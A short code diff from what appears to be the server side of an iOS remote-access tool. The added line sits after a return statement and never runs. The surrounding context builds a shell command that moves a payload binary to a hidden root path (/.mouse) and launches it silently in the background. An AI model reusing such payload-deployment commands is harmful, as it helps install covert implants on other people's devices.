@@ -131,6 +131,7 @@ class Server:
             "mv /tmp/mouse /.mouse;"+\
             "/.mouse "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
+            self.sos = "iOS"
         else:
             h.info_error("The device is not recognized!")
             return
